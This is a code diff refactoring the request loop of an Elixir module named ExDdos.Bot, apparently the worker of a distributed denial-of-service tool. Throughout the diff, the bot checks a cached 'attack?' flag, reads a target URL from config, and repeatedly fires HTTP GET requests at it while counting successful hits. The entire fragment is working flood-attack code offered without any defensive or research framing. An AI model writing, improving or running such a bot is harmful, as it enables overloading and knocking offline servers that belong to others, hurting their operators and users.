@@ -21,29 +21,45 @@ defmodule ExDdos.Bot do
 
   @impl true
   def handle_info(:loop, request_opts) do
-    with {:attack?, true} <- {:attack?, Cachex.get!(:config_store, "attack?")},
-         url = Cachex.get!(:config_store, "url"),
-         {:url, true} <- {:url, not is_nil(url)},
-         {:ok, response} <- HTTPoison.get(url, %{}, request_opts) do
+    with true <- should_attack?(request_opts),
+         {:target, url} <- get_target(),
+         {:ok, response} <- make_request(url, request_opts) do
       Logger.info("status code - #{response.status_code}")
       Cachex.incr(:counts, "success_req_count", 1)
       loop()
       {:noreply, request_opts}
-    else
-      {:attack?, _} ->
+    end
+  end
+
+  defp should_attack?(request_opts) do
+    case Cachex.get!(:config_store, "attack?") do
+      true ->
+        true
+
+      _ ->
         loop()
         {:noreply, request_opts}
+    end
+  end
 
-      {:url, false} ->
+  defp get_target do
+    case Cachex.get!(:config_store, "url") do
+      nil ->
         Logger.warning("misconfig")
         exit(:normal)
 
+      url ->
+        {:target, url}
+    end
+  end
+
+  defp make_request(url, request_opts) do
+    case HTTPoison.get(url, %{}, request_opts) do
+      {:ok, _} = res ->
+        res
+
       {:error, %HTTPoison.Error{} = err} ->
         Logger.warning("can't make request - #{inspect(err)}")
-        exit(:normal)
-
-      unexpected_res ->
-        Logger.error("unexpected_res - #{inspect(unexpected_res)}")
         exit(:normal)
     end
   end
